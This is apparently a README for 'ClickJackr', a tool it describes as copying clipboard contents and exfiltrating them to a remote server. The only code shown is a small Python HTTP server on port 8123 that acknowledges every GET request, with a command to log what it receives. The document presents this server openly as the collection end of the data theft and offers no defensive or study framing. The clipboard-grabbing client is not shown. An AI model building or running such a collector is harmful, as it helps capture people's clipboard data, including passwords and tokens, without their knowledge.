# ClickJackr

Copies clipboard contents and exifls to remote server

---

# Python3 webserver that will always return a 200

Run with the following command for logging:
```./clickjacker-server.py | tee -a clickjack.log```

```#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = 8123

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        message = "recv"
        self.protocol_version = "HTTP/1.1"
        self.send_response(200)
        self.send_header("Content-Length",len(message))
        self.end_headers()
        self.wfile.write(bytes(message,'utf8'))
        return

def run():
    server = ('',PORT)
    httpd = HTTPServer(server,RequestHandler)
    httpd.serve_forever()

run()
```
